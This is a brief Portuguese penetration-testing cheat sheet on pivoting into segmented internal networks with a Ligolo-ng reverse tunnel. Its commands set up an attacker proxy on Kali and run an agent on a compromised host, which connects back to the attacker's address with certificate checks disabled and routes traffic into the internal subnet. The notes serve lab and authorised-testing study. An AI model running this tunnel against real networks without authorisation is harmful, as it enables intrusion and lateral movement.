---
title: "Ligolo Tunnel"
---

# Ligolo Tunnel

Tunnel reverso via Ligolo-ng para pivoting em redes segmentadas. O proxy roda no Kali e o agente no host comprometido, criando uma interface TUN que roteia o tráfego para a rede interna transparentemente.

```shell
# Kali — criar interface e iniciar proxy
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
~/exp/tools/lig_proxy-linux64 -selfcert

# Alvo (Debian/Linux) — conectar ao proxy
~/exp/tools/lig_agent-linux64 -connect 192.168.100.2:11601 -ignore-cert
```

```shell
# Ligolo — selecionar sessão e obter rede alvo
session
1
ifconfig

# Kali — adicionar rota para a rede interna
sudo ip route add 192.168.1.0/24 dev ligolo

# Ligolo — iniciar o túnel
start --tun ligolo
```
